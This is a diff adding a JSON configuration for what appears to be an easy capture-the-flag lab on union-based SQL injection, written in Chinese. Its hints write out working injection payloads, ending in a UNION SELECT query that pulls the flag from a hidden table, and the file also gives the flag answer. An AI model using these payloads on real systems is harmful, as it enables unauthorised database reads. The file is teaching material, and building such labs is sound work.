@@ -1,0 +1,39 @@
+{
+  "id": "sql1",
+  "path": "/sql1",
+  "type": "php",
+  "public": false,
+  "backend": "mysql:sqlilab1",
+  "note": "联合注入",
+  "category": "sql",
+  "title": "登上数据库的第一层楼 · 联合注入",
+  "difficulty": "easy",
+  "url_path": "/sql1",
+  "flag": "flag{sql1_5f3a91c2}",
+  "knowledge": [
+    {
+      "name": "PortSwigger — SQL 注入入门（EN）",
+      "url": "https://portswigger.net/web-security/sql-injection"
+    },
+    {
+      "name": "PortSwigger — UNION 注入攻击",
+      "url": "https://portswigger.net/web-security/sql-injection/union-attacks"
+    },
+    {
+      "name": "sqlmap 自动化工具",
+      "url": "https://github.com/sqlmapproject/sqlmap"
+    }
+  ],
+  "hints": [
+    "输入 <code>?id=1 and 1=1</code> 与 <code>?id=1 and 1=2</code> 对比结果，确认注入存在（数字型，无需引号）。",
+    "用 <code>?id=1 order by 3</code> / <code>order by 4</code> 测出列数：报错与成功的交界处就是列数。",
+    "页面回显的是第 2、3 列：<code>?id=-1 union select 1,2,3</code> 先看哪几列显示，再把 2 换成想查的内容。",
+    "flag 藏在同库的 <code>fl4g</code> 表里（字段名也叫 flag）：<code>?id=-1 union select 1,(select flag from fl4g limit 1),3</code>"
+  ],
+  "description_html": "一个根据 id 查询用户信息的小站。数字 id 直接拼进了 SQL——先用 <code>ORDER BY</code> 摸清列数，再用 <code>UNION SELECT</code> 让数据库把藏起来的 flag 表内容直接“回显”到页面上。",
+  "entry": "index.php",
+  "runtime": "php",
+  "writeup": "writeup.md",
+  "prev": null,
+  "next": "sql2"
+}
